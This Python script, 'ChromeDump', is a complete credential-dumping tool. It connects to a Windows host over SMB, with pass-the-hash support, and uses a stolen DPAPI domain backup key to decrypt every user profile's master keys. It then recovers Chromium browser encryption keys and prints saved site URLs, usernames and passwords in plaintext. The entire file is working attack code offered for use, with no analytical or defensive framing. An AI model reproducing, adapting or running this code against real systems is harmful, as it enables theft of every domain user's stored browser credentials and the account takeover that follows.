#!/usr/bin/env python3
"""
ChromeDump  Chrome credential dumper via SMB + DPAPI domain backup key (PVK)

Usage:
  python3 chromedump.py -t 172.16.2.102 -d DEV -u joe \
      -H :31d6cfe0d16ae931b73c59d7e0c089c0 \
      --pvk 'G$BCKUPKEY_99B2981E-C165-4003-B9E0-6EB6C210BC4D.pvk'
"""

import argparse, sys

from smb_utils   import connect, read_file, list_dir
from dpapi_utils import load_pvk, decrypt_masterkey
from chrome      import BROWSER_PATHS, get_aes_key, decrypt_logins


def collect_masterkeys(smb, profiles, rsa_cipher):
    masterkeys = {}
    for profile in profiles:
        protect_base = rf'Users\{profile}\AppData\Roaming\Microsoft\Protect'
        for sid in list_dir(smb, 'C$', protect_base):
            if not sid.startswith('S-'):
                continue
            mk_dir = rf'{protect_base}\{sid}'
            for mk_name in list_dir(smb, 'C$', mk_dir):
                if mk_name.lower() == 'preferred':
                    continue
                try:
                    mk_bytes      = read_file(smb, 'C$', rf'{mk_dir}\{mk_name}')
                    guid, mk      = decrypt_masterkey(mk_bytes, rsa_cipher)
                    if mk:
                        masterkeys[guid] = mk
                        print(f'  [+] {profile}/{sid}/{mk_name} -> {mk.hex()[:16]}...')
                    else:
                        print(f'  [-] {profile}/{sid}/{mk_name} -> no DomainKey (local-only)')
                except Exception as e:
                    print(f'  [-] {profile}/{sid}/{mk_name} -> {e}')
    return masterkeys


def collect_credentials(smb, profiles, masterkeys):
    all_creds = []
    for profile in profiles:
        for browser, rel_path in BROWSER_PATHS.items():
            user_data = rf'Users\{profile}\{rel_path}'
            try:
                local_state = read_file(smb, 'C$', rf'{user_data}\Local State')
            except Exception:
                continue

            aes_key = get_aes_key(local_state, masterkeys)
            if not aes_key:
                print(f'  [-] {profile}/{browser}: AES key decrypt failed')
                continue

            print(f'  [*] {profile}/{browser}: AES key {aes_key.hex()[:16]}...')

            sub_profiles = ['Default'] + [
                s for s in list_dir(smb, 'C$', user_data)
                if s.lower().startswith('profile')
            ]
            for sub in sub_profiles:
                try:
                    ld_bytes = read_file(smb, 'C$', rf'{user_data}\{sub}\Login Data')
                    creds    = decrypt_logins(ld_bytes, aes_key)
                    if creds:
                        print(f'    [+] {sub}: {len(creds)} credential(s)')
                        for url, user, pw in creds:
                            all_creds.append((profile, browser, sub, url, user, pw))
                except Exception:
                    pass
    return all_creds


def print_results(creds):
    col = (12, 10, 10, 45, 20)
    hdr = (
        f"{'Profile':<{col[0]}} {'Browser':<{col[1]}} {'Sub-profile':<{col[2]}}"
        f" {'URL':<{col[3]}} {'Username':<{col[4]}} Password"
    )
    print(f'\n{hdr}')
    print('=' * (sum(col) + len(col) + 10))
    for win_prof, browser, sub, url, user, pw in creds:
        print(
            f'{win_prof:<{col[0]}} {browser:<{col[1]}} {sub:<{col[2]}}'
            f' {url:<{col[3]}} {user:<{col[4]}} {pw}'
        )


def main():
    p = argparse.ArgumentParser(
        description='Dump Chromium browser credentials via SMB using the DPAPI domain backup key'
    )
    p.add_argument('-t', '--target',   required=True, help='Target IP or hostname')
    p.add_argument('-d', '--domain',   default='',    help='Windows domain')
    p.add_argument('-u', '--username', required=True, help='SMB username')
    p.add_argument('-H', '--hashes',   default='',    help=':NTHASH or LMHASH:NTHASH')
    p.add_argument('-p', '--password', default='',    help='Cleartext password')
    p.add_argument('--pvk',            required=True, help='Domain backup key PVK file')
    args = p.parse_args()

    lm_hash = nt_hash = ''
    if args.hashes:
        parts   = args.hashes.split(':')
        lm_hash = parts[0]
        nt_hash = parts[1] if len(parts) > 1 else parts[0]

    print(f'[*] Connecting to {args.target}')
    smb = connect(args.target, args.username, args.password, args.domain, lm_hash, nt_hash)
    print(f'[+] Authenticated as {args.domain}\\{args.username}')

    print(f'[*] Loading PVK: {args.pvk}')
    rsa_key, rsa_cipher = load_pvk(args.pvk)
    print(f'[+] Backup key loaded ({rsa_key.n.bit_length()}-bit RSA)')

    profiles = list_dir(smb, 'C$', r'Users')
    print(f'[*] User profiles: {profiles}')

    print('[*] Decrypting master keys')
    masterkeys = collect_masterkeys(smb, profiles, rsa_cipher)
    print(f'[*] Decrypted {len(masterkeys)} master key(s)')

    if not masterkeys:
        print('[-] No master keys decrypted, cannot continue')
        sys.exit(1)

    print('[*] Scanning for browser credentials')
    creds = collect_credentials(smb, profiles, masterkeys)

    if not creds:
        print('[-] No credentials recovered')
        return

    print_results(creds)


if __name__ == '__main__':
    main()
